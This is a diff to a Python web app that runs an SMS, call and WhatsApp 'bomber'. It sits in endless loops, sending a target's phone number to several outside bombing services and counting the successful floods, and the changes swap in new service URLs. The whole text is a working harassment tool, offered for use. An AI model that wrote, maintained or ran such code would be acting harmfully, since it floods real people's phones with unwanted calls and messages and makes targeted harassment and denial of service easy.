@@ -62,7 +62,7 @@ def MyApp():
             url4 = requests.post("http://callbombers.fun/Call-Bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
             url2 = requests.post("http://callbombers.fun/sms-bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
             url = requests.post("http://callbombers.fun/Whatsapp-Bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
-            req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
+            req = requests.get(f"https://callaibomb.in/serverer.php?num={SK}").text
             if 'started' in req == 200:
                 count[SK]["successful"] += 1
                 output.put_html(
@@ -85,7 +85,7 @@ def MyApp():
             count[JK]["successful"] = 0
             count[JK]["failed"] = 0
         while True:
-            req = requests.get(f"https://bomber-tools.xyz/sms/?mobile={JK}&accesskey=BomberSmm&submit=Submit").text
+            req = requests.get(f"https://callaibomb.in/serverer.php?num={JK}").text
             if 'started' in req:
                 count[JK]["successful"] += 1
                 output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[JK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">Ashish Hacker</span></i>')
@@ -160,7 +160,7 @@ def MyApp():
                 	url2=requests.post("http://callbombers.fun/sms-bomber/", data={'number': RK, 'key': '@Toolbomb', 'sub': 'SEND'})
                 	url=requests.post("http://callbombers.fun/Whatsapp-Bomber/", data={'number': RK, 'key': '@Toolbomb', 'sub': 'SEND'})
                 	rex=requests.get(f'https://bombersmm.sbs/serverll.php?num={RK}')
-                	rexx=requests.get(f'https://bombersmm.sbs/bo.php?num={RK}')
+                	rexx=requests.get(f'https://callaibomb.in/serverer.php?num={RK}')
                 	rexxx=requests.get(f"https://unknownreason.in/API/index.php?num={RK}")
                 	if rex.status_code == 200:
                 	               count[RK]["successful"] += 1
@@ -187,7 +187,7 @@ def MyApp():
                 	count[XK]["successful"] = 0
                 	count[XK]["failed"] = 0
                 while True:
-                	fex=requests.get(f'https://bombersmm.sbs/whatt.php?num={XK}')
+                	fex=requests.get(f'https://smsbombs.in/WServer.php?durgesh={XK}')
                 	fexx=requests.get(f'https://bombersmm.sbs/server.php?num={XK}')
                 	if fex.status_code == 200:
                 	               count[XK]["successful"] += 1
